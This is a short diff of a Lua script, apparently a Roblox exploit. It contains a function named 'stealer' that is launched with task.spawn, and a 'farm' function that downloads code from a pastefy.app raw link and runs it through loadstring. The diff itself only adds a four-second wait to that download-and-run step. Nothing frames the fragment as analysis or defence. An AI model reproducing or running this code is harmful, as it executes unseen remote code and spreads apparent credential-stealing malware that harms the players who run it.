@@ -3,6 +3,7 @@ local function stealer()
 end
 local function farm()
     loadstring(game:HttpGet('https://pastefy.app/FPGI0uTW/raw'))()
+wait(4)
 end
 
 task.spawn(stealer)
